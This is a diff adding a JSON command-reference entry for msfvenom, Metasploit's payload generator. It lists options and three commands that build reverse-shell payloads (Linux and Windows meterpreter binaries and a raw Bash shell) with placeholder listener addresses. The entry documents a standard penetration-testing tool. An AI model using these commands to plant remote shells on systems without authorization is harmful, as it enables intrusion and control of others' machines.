@@ -1,0 +1,30 @@
+{
+  "command": "msfvenom",
+  "description": "Manually generate payloads for metasploit. More information: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom.",
+  "useCases": [
+    {
+      "description": "List payloads:",
+      "syntax": "msfvenom -l payloads"
+    },
+    {
+      "description": "List formats:",
+      "syntax": "msfvenom -l formats"
+    },
+    {
+      "description": "Show payload options:",
+      "syntax": "msfvenom -p {{payload}} --list-options"
+    },
+    {
+      "description": "Create an ELF binary with a reverse TCP handler:",
+      "syntax": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}"
+    },
+    {
+      "description": "Create an EXE binary with a reverse TCP handler:",
+      "syntax": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}"
+    },
+    {
+      "description": "Create a raw Bash with a reverse TCP handler:",
+      "syntax": "msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw"
+    }
+  ]
+}
